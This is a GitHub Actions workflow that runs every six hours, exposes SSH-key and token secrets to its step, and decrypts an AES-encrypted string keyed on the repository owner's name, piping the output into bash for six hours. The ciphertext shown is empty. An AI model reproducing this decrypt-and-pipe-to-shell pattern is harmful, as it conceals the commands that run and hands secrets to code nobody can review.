name: rpshantinggui
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: rpshantinggui
        env:
          SHOGUNCAO_HAVA_A_TEST_SSH_KEY: ${{ secrets.SHOGUNCAO_HAVA_A_TEST_SSH_KEY }}
          TARGET_HAVA_A_TEST_SSH_KEY: ${{ secrets.TARGET_HAVA_A_TEST_SSH_KEY }}
          TOKEN: ${{ secrets.TOKEN }}
        run: |
          echo "" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash -s -- --working_seconds "21600"
